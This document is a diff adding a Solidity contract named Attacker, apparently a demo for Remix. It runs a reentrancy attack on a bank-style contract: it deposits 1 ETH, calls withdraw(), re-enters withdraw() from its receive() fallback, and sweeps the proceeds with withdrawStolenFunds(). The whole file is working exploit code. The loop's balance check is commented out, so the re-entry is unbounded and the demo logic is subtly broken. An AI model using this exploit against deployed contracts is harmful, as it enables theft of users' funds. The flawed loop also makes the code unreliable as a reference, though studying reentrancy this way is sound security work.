@@ -1,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IVulnerableBank {
+    function deposit() external payable;
+    function withdraw() external;
+    function getBalance() external view returns (uint256); // Added for clarity
+}
+
+contract Attacker {
+    IVulnerableBank public target;
+    uint256 public attackCount;
+
+    constructor(address _target) payable {
+        target = IVulnerableBank(_target);
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
+
+        // Deposit to establish a balance
+        target.deposit{value: 1 ether}();
+
+        // Start the reentrancy attack
+        target.withdraw();
+    }
+
+    // Fallback function - this is where the reentrancy happens
+    receive() external payable {
+        attackCount++;
+
+        // Remove console.log (not supported in Remix)
+        // if (address(target).balance >= 1 ether) {
+        //     target.withdraw();
+        // }
+        // Uncomment below for Remix testing (simplified logic)
+        target.withdraw(); // Force reentrancy (for demo)
+    }
+
+    function getContractBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function withdrawStolenFunds() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
